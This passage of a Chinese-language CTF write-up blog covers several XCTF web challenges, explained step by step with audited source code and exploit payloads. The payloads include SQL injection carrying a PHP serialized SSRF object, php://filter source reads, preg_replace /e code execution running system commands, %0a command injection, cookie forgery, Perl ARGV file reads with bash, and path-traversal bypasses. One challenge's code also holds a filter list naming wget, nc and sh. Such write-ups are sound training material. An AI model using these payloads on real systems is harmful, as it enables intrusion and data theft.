<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
<span class="hljs-function"></span>&#123;  
    <span class="hljs-variable">$ch</span> = curl_init();   <span class="hljs-comment">//初始化一个curl会话</span>

    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);   <span class="hljs-comment">//设置url和相应的参数</span>
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);         	   <span class="hljs-comment">// 执行这个cURL会话</span>
    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);  <span class="hljs-comment">//获取状态码</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
    &#125;
    curl_close(<span class="hljs-variable">$ch</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>) //这是注册账号时检测<span class="hljs-title">blog</span>是否合法</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
&#125;
&#125;</code></pre>

<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
<pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$url</span>)</span></span> 
<span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;blog)</span></span></code></pre>

<p>这里get中的参数取自blog，所以我们可以利用反序列化构造出一个ssrf，将blog位置修改为我们想要访问的位置，结合上面的提示就构造出下面的payload：</p>
<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>

<p>查看源码，解base64。</p>
<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>进入页面只有一个是有用的，进入设备维护中心</p>
<p><img src="https://i.loli.net/2020/12/02/Qje1Yih9dwH3xnm.png" alt="image-20201202170901536"></p>
<p>先点击云平台设备维护中心，url会发生改变出现page参数，这一看就是典型的读取源码</p>
<p>构造payload:</p>
<pre><code class="hljs awk">?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index.php</code></pre>

<p>源码中的php代码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) &#123;
<span class="hljs-keyword">if</span> (ctype_alnum(<span class="hljs-variable">$page</span>)) &#123;
<span class="hljs-meta">?&gt;</span>
    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
    &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;
        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;
    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
<span class="hljs-meta">&lt;?php</span>
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-meta">?&gt;</span>
        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
        &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;
            &lt;p class=&quot;lead&quot;&gt;
                <span class="hljs-meta">&lt;?php</span>
                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;input&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">//这里是对几个关键词的过滤，我们读取源码时没有用到这几个关键词所以没有影响</span>
                    <span class="hljs-keyword">die</span>();
                &#125;

                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;
                    <span class="hljs-keyword">die</span>();
                &#125;

                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;
                    <span class="hljs-keyword">die</span>();
                &#125;

                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);
                &#125;
                    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);
                    <span class="hljs-keyword">die</span>();
                <span class="hljs-meta">?&gt;</span>
        &lt;/p&gt;
        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
<span class="hljs-meta">&lt;?php</span>
&#125;&#125;
<span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span>

<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123; <span class="hljs-comment">//xxf头</span>

    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;   
   
    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];  <span class="hljs-comment">//get 提交三个参数</span>
    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];
    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];

    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;
        preg_replace(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>();
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span>
</code></pre>

<p>前面代码没有突破点，直到看到<code>preg_replace</code></p>
<p><img src="https://i.loli.net/2020/12/02/4FfYrPBc1xE9Kzk.png" alt="preg_replace"></p>
<p>漏洞</p>
<p>$pattern 存在 /e 模式修正符，允许代码执行</p>
<p>/e 模式修正符，是 *<em>preg_replace() *</em> 导致 $replacement 部分当做php代码来执行。</p>
<p>所以可以构造如下</p>
<p>payload</p>
<pre><code class="hljs sas">?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test
?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;ls s3chahahaDir/&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test
?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;ls s3chahahaDir/flag&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test
?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;cat s3chahahaDir/flag/flag.php&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test</code></pre>

<p>参考:<a href="https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</a> </p>
<h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><h3 id="0x1注册玩一下"><a href="#0x1注册玩一下" class="headerlink" title="0x1注册玩一下"></a>0x1注册玩一下</h3><p>​        进入页面发下是一个买彩票的，先注册一个账号，初始有20块钱，要买flag，需要99999999，显然不可能</p>
<p>还有一个买彩票的地方，每次花2块钱两个号码对了奖励五块，这些都不重要。</p>
<p><img src="https://i.loli.net/2020/12/02/f2TOhKdw1Bo9QY6.png" alt="image-20201202220622597"></p>
<p>开始是想着通过脚本多买几次，后来发现不对啊，每次都是买完了之后中将号码才公布出来，脚本就没意义了，所以这个想法断了。</p>
<p>于是去看看了别的</p>
<h3 id="0x2-git源码泄露"><a href="#0x2-git源码泄露" class="headerlink" title="0x2 git源码泄露"></a>0x2 git源码泄露</h3><p>​        下载了好几个文件，看看了其中有用的只有<code>api.php</code>，代码太长了，复制了重要的部分</p>
<p>审计代码</p>
<pre><code class="hljs php"><span class="hljs-comment">//随机生成中将号码</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random_win_nums</span>(<span class="hljs-params"></span>)</span>&#123;
	<span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;
	<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;
		<span class="hljs-variable">$result</span> .= random_num();  <span class="hljs-comment">//利用自定义的随机函数生成随机数</span>
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;
&#125;
<span class="hljs-comment">//检测是否中奖以及 奖励和扣费规则</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"><span class="hljs-variable">$req</span></span>)</span>&#123;
	require_registered();  <span class="hljs-comment">//检测是否注册</span>
	require_min_money(<span class="hljs-number">2</span>);  <span class="hljs-comment">//是否有2块钱买彩票</span>

	<span class="hljs-variable">$money</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>];  <span class="hljs-comment">//用户的钱 </span>
	<span class="hljs-variable">$numbers</span> = <span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;numbers&#x27;</span>];   <span class="hljs-comment">//用户买的彩票号码</span>
	<span class="hljs-variable">$win_numbers</span> = random_win_nums();  <span class="hljs-comment">//中奖号码</span>
	<span class="hljs-variable">$same_count</span> = <span class="hljs-number">0</span>;              <span class="hljs-comment">//记录有几位中奖</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;		   <span class="hljs-comment">// 判断有几位中奖</span>
		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//重点来了</span>
			<span class="hljs-variable">$same_count</span>++;
		&#125;
	&#125;
    	<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$same_count</span>) &#123;
		<span class="hljs-comment">//pass</span>
	&#125;
	<span class="hljs-variable">$money</span> += <span class="hljs-variable">$prize</span> - <span class="hljs-number">2</span>;
	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>] = <span class="hljs-variable">$money</span>;
	response([<span class="hljs-string">&#x27;status&#x27;</span>=&gt;<span class="hljs-string">&#x27;ok&#x27;</span>,<span class="hljs-string">&#x27;numbers&#x27;</span>=&gt;<span class="hljs-variable">$numbers</span>, <span class="hljs-string">&#x27;win_numbers&#x27;</span>=&gt;<span class="hljs-variable">$win_numbers</span>, <span class="hljs-string">&#x27;money&#x27;</span>=&gt;<span class="hljs-variable">$money</span>, <span class="hljs-string">&#x27;prize&#x27;</span>=&gt;<span class="hljs-variable">$prize</span>]);
&#125;</code></pre>



<p>上面的代码看着像是没什么问题，但是对<code>==</code>敏感的一眼就会发现这里存在问题</p>
<pre><code class="hljs php"><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;		   <span class="hljs-comment">// 判断有几位中奖</span>
		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//重点来了</span>
			<span class="hljs-variable">$same_count</span>++;
		&#125;
	&#125;</code></pre>

<p>这里判断是否相等居然用 <code>==</code>，就很离谱，也是突破点，测试效果如下 </p>
<p><img src="https://i.loli.net/2020/12/02/EpgPnUsz1FBfq9k.png" alt="caipiao-1"></p>
<p>所以思路就是，抓包修改我们输入的号码都为True，就行了，一次中奖不够就多买几次</p>
<p><strong>注意这里上传数据时使用的是json格式</strong>，<a href="https://www.runoob.com/json/js-json-arrays.html">json数组类型</a></p>
<p><img src="https://i.loli.net/2020/12/02/qwTPDFZXuaSitR9.png" alt="image-20201202221043572"></p>
<p>之后返回浏览器买flag即可</p>
<h2 id="favorite-number"><a href="#favorite-number" class="headerlink" title="favorite_number"></a>favorite_number</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//php5.5.9</span>
<span class="hljs-variable">$stuff</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;stuff&quot;</span>];
<span class="hljs-variable">$array</span> = [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$stuff</span> === <span class="hljs-variable">$array</span> &amp;&amp; <span class="hljs-variable">$stuff</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;
    <span class="hljs-variable">$num</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];
    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/^\d+$/im&quot;</span>,<span class="hljs-variable">$num</span>))&#123;
        <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="hljs-variable">$num</span>))&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;my favorite num is:&quot;</span>;
            system(<span class="hljs-string">&quot;echo &quot;</span>.<span class="hljs-variable">$num</span>);
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Bonjour!&#x27;</span>;
        &#125;
    &#125;
&#125; <span class="hljs-keyword">else</span> &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;</code></pre>



<h3 id="0x1代码审计"><a href="#0x1代码审计" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><p>代码意思</p>
<blockquote>
<p>输入一个数组stuff,stuff要和array相同，但是$stuff[0] != ‘admin’</p>
<p>这是一个矛盾的判断，所以要想办法绕过</p>
<p>下面是提交一个数字，通过判断后打印出这个数字并执行system函数</p>
<p>这里一定存在命令执行</p>
</blockquote>
<p>题目直接给了源码，并且表明了php版本为5.5.9，那就说明这个题目一定和这个版本的漏洞有关，google一下</p>
<p><a href="https://segmentfault.com/q/1010000003871264，这是与这题很像的一题">https://segmentfault.com/q/1010000003871264，这是与这题很像的一题</a></p>
<p>php5.5.9的数组的key溢出漏洞</p>
<p>结合上面的题目构造出payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">stuff</span>[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span></code></pre>

<p>页面成功打印出了<code>my favorite num is:123</code>,说明前面已经绕过成功了</p>
<h3 id="0x2-绕过数字，命令注入"><a href="#0x2-绕过数字，命令注入" class="headerlink" title="0x2 绕过数字，命令注入"></a>0x2 绕过数字，命令注入</h3><p>因为正则表达式最后的m允许多行匹配，所以这里可以使用%0a绕过数字检测</p>
<p>开始构造出的</p>
<pre><code class="hljs apache"><span class="hljs-attribute">stuff</span>[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span>%<span class="hljs-number">0</span>als /</code></pre>

<p>成功列出了目录，看到了flag，但是读取的时候发现flag关键被过滤了</p>
<p>所以不得不换一种方法</p>
<pre><code class="hljs routeros">ls -i
<span class="hljs-comment"># 列出当前⽂件列表，取出inode</span>

<span class="hljs-comment"># find找到对应inode的⽂件</span>
<span class="hljs-builtin-name">find</span> / -inum

<span class="hljs-comment"># more读取对应的文件</span>
more `<span class="hljs-builtin-name">find</span> / -inum `</code></pre>



<p><img src="https://i.loli.net/2020/12/03/84FbyGXJTK157LA.png" alt="find"></p>
<p>所以最后的payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">stuff</span>[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">111</span>%<span class="hljs-number">0</span>amore `find / -inum <span class="hljs-number">38667190</span>`</code></pre>



<p><img src="https://i.loli.net/2020/12/03/cesVHi2EJPogUq9.png" alt="more"></p>
<p>参考：</p>
<blockquote>
<p><a href="https://www.coodesker.com/">https://www.coodesker.com/</a></p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/109365511">https://blog.csdn.net/weixin_44604541/article/details/109365511</a></p>
</blockquote>
<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><h3 id="0x1获得admin权限"><a href="#0x1获得admin权限" class="headerlink" title="0x1获得admin权限"></a>0x1获得admin权限</h3><p>先注册登录看看，页面功能很简单，当点击manage时，提示需要admin账号才可以，所以接下来就要想办法拿到admin账号</p>
<p>在注册的时候有一个找回密码的功能，当我们点进去的时候可以看到，修改密码只需要生日和地址</p>
<p><img src="https://i.loli.net/2020/12/04/gMlj3mK1dIGViZS.png" alt="image-20201204130616230"></p>
<p>这就想到了刚才登录页面显示的个人信息，那么怎么才能拿到admin的个人信息就是一个问题</p>
<p>不妨先抓包看一下，可以看到cookie中有一个user，这个值像是md5，在线解密一下</p>
<p><img src="https://i.loli.net/2020/12/04/Mok5CT4UrhnfQRE.png" alt="image-20201204125903267"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">82ed7a14920dd2db1b6657348656eaa5</span>
<span class="hljs-attribute">7</span>:<span class="hljs-number">123</span></code></pre>

<p>也就是uid+username的md5值，那我们是不是可以伪造一个这样的cookie然后到个人信息的页面提交获取信息</p>
<pre><code class="hljs apache"><span class="hljs-attribute">md5</span>(<span class="hljs-number">1</span>:amdin)=<span class="hljs-number">4</span>b<span class="hljs-number">9987</span>ccafacb<span class="hljs-number">8</span>d<span class="hljs-number">8</span>fc<span class="hljs-number">08</span>d<span class="hljs-number">22</span>bbca<span class="hljs-number">797</span>ba</code></pre>

<p><img src="https://i.loli.net/2020/12/04/hmOfpoeK4s2jyvZ.png" alt="bug-1"></p>
<p>这样就获取了信息，再去修改密码登录</p>
<h3 id="0x2上传绕过"><a href="#0x2上传绕过" class="headerlink" title="0x2上传绕过"></a>0x2上传绕过</h3><p>登录后点击manage提示非法IP，直接抓包添加xxf，得到提示</p>
<pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></code></pre>

<p>访问一下上面的地址一开始以为do是submit，但是提交没反应，又改成了upload，这样就对了，出来一个上传图片的网页</p>
<p>上传php文件，出现前端检测提示</p>
<p>那就直接抓包，把php改成php5修改了MIME为image/jpeg，但是还是提示可以看出来是一个php文件，可能检测了文件开头信息，那就改成下面格式的一句话木马</p>
<p>获得了flag</p>
<p><img src="https://i.loli.net/2020/12/04/Nos2ZmYglFMIcLx.png" alt="image-20201204132940298"></p>
<h2 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h2><p>题目给了三个页面，其中有一个文件上传的页面，随便上传一个文件可以发现会将文件的内容显示出来，猜测这里使用了param()函数</p>
<p><strong>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</strong></p>
<p>给了提示<code>Perl File Upload</code>第一次见这个东西，在网上学习了一下</p>
<p>大佬猜测出的后天源码</p>
<pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">strict</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">warning</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">CGI</span>;
my <span class="hljs-variable">$cgi</span>=CGI-&gt;new;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$cgi</span>-&gt;upload(<span class="hljs-string">&#x27;file&#x27;</span>))&#123;
	my <span class="hljs-variable">$file</span>=<span class="hljs-variable">$cgi</span>-&gt;param(<span class="hljs-string">&#x27;$file&#x27;</span>);
	<span class="hljs-keyword">while</span>(&lt;<span class="hljs-variable">$file</span>&gt;) &#123;<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>);&#125;
&#125;</code></pre>

<p>   1.抓包修改url和上传内容，修改成如图所示</p>
<p><img src="https://i.loli.net/2020/12/09/UdBY7aruk2JhXim.png" alt="image-20201209092628853"></p>
<p><img src="https://i.loli.net/2020/12/09/n6DmvYEfM8HeI4h.png" alt="image-20201209091529965"></p>
<ol start="2">
<li><p>先读取file.pl文件，盲猜在/var/www/cgi-bin/file.pl，将3部分payload修改 为：/cgi­bin/file.pl?/var/www/cgi-bin/file.pl </p>
</li>
<li><p>利用bash来进行读取当前目录下的文件，将3部分payload修改为：/cgibin/file.pl?/bin/bash%20­c%20ls${IFS}/| </p>
<p><img src="https://i.loli.net/2020/12/09/7g6WiKyzYG5vQsd.png" alt="image-20201209093015408"></p>
</li>
<li><p>读取当前目录的flag文件内容,将3部分payload修改为：/cgi­bin/file.pl?/flag</p>
</li>
</ol>
<p><img src="https://i.loli.net/2020/12/09/n7xUhu69oBfGwaM.png" alt="image-20201209092658534"></p>
<p><a href="https://adworld.xctf.org.cn/task/writeup?type=web&id=5001&number=3&grade=1&page=2">参考</a></p>
<h2 id="Web-php-wrong-nginx-config"><a href="#Web-php-wrong-nginx-config" class="headerlink" title="Web_php_wrong_nginx_config"></a>Web_php_wrong_nginx_config</h2><h3 id="0x1信息收集"><a href="#0x1信息收集" class="headerlink" title="0x1信息收集"></a>0x1信息收集</h3><p>进入页面发现要登录，但是没有账号，扫描目录也没发现注册账号的页面，但是发现了robots.txt，其中给了hint.php和hack.php</p>
<p>hint.php</p>
<pre><code class="hljs awk">配置文件也许有问题呀：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-enabled/</span>site.conf</code></pre>

<p>还有这几个</p>
<p><img src="https://i.loli.net/2020/12/09/iDh1arKt2lNRfxk.png" alt="image-20201209100341300"></p>
<p>抓包发现cookie，将其改为1后发现就可以登录了，这里是使用浏览器的cookie编辑插件</p>
<p><img src="https://i.loli.net/2020/12/09/fk6YVQZIFruy8ov.png" alt="image-20201209095233466"></p>
<p>登录后的url</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>:<span class="hljs-number">35234</span><span class="hljs-regexp">/admin/</span>admin.php?file=index&amp;ext=php</code></pre>

<h2 id="0x2读取配置文件"><a href="#0x2读取配置文件" class="headerlink" title="0x2读取配置文件"></a>0x2读取配置文件</h2><p>尝试读取index.php和admin.php源码都失败了，再试试robots.txt中的页面</p>
<p>直接输入路径会跳转到主页不显示内容，可能存在过滤导致文件路径无效</p>
<pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled/site.conf&amp;ext=</code></pre>

<p>用双写绕过</p>
<pre><code class="hljs awk">?file=....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled/site.conf&amp;ext=</code></pre>

<p>拿到了配置文件</p>
<pre><code class="hljs stata">server &#123;
    listen 8080; ## listen <span class="hljs-keyword">for</span> ipv4; this <span class="hljs-keyword">line</span> is default and implied
    listen [::]:8080; ## listen <span class="hljs-keyword">for</span> ipv6

    root /<span class="hljs-keyword">var</span>/www/html;
    index index.php index.html index.htm;
    port_in_redirect off;
    server_name _;

    # Make site accessible from http:<span class="hljs-comment">//localhost/</span>
    #server_name localhost;

    # <span class="hljs-keyword">If</span> block <span class="hljs-keyword">for</span> setting the time <span class="hljs-keyword">for</span> the logfile
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$time_iso8601</span> ~ <span class="hljs-string">&quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;</span>) &#123;
       <span class="hljs-keyword">set</span> <span class="hljs-variable">$year</span> <span class="hljs-variable">$1</span>;
       <span class="hljs-keyword">set</span> <span class="hljs-variable">$month</span> <span class="hljs-variable">$2</span>;
       <span class="hljs-keyword">set</span> <span class="hljs-variable">$day</span> <span class="hljs-variable">$3</span>;
    &#125;
    # Disable sendfile <span class="hljs-keyword">as</span> per https:<span class="hljs-comment">//docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>
    sendfile off;

        <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$http_x_forwarded_for</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_x_forwarded_for_filt</span> ~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+) &#123;
                <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$1</span>???;
        &#125;

    # Add stdout logging

    access_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-variable">$hostname</span>-access-<span class="hljs-variable">$year</span>-<span class="hljs-variable">$month</span>-<span class="hljs-variable">$day</span>.<span class="hljs-keyword">log</span> openshift_log;
    error_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span> info;

    location / &#123;
        # First attempt to serve request <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span>, then
        # <span class="hljs-keyword">as</span> directory, then fall back to index.html
        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;
        server_tokens off;
    &#125;

    #error_page 404 /404.html;

    # redirect server <span class="hljs-keyword">error</span> pages to the static page /50x.html
    #
    error_page 500 502 503 504 /50x.html;
    location = /50x.html &#123;
        root /usr/share/nginx/html;
    &#125;
    location ~ \.php$ &#123;
